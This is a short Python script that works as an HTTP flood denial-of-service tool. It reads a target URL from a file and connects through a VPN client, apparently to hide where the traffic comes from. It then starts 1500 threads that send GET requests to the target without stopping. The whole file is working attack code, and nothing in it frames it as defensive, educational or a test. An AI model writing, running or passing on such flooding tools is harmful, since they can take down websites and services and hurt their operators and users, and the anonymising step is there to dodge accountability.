import threading
import requests
import os 

URL = ""

with open("url.txt","r") as r:
    URL = r.readline()

os.system("warp-cli.exe connect")

def f():
    while True:
        try:
            res = requests.get(URL)
            print(res.status_code)
        except Exception as e:
            print(e)

fsc = [threading.Thread(target=f,args=()) for i in range(1500) ]

for i in fsc:
    i.start()